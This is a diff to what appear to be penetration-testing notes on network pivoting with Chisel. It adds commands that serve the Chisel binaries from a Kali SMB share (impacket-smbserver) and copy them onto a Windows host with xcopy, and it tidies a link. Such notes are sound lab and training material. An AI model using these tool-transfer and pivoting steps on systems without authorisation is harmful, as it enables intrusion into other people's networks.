@@ -14,6 +14,24 @@ socks5          127.0.0.1 1080
 ```
 Comment `socks4` line and add `socks5` line.
 
+## Sharing and transferring the files
+
+```
+cd /usr/share/windows-resources/binaries
+impacket-smbserver share $(pwd) -smb2support
+```
+
+- x86
+```
+xcopy \\<Kali IP>\share\chisel\x86\chisel.exe C:\Temp\chisel\
+```
+
+- x64
+```
+xcopy \\<Kali IP>\share\chisel\x64\chisel.exe C:\Temp\chisel\
+```
+
+
 ## Kali <==> Windows JumpBox <==> Target
 
 Kali - server
@@ -58,5 +76,5 @@ Access with dbeaver
 
 ## Links
 
-- [YouTube - Elevate Cyber - Chisel](https://www.youtube.com/watch?v=dIqoULXmhXg){:target="_blank"}
+- [YouTube - Elevate Cyber - Chisel](https://www.youtube.com/watch?v=dIqoULXmhXg)
 - [Port Forwarding with Chisel](https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel)
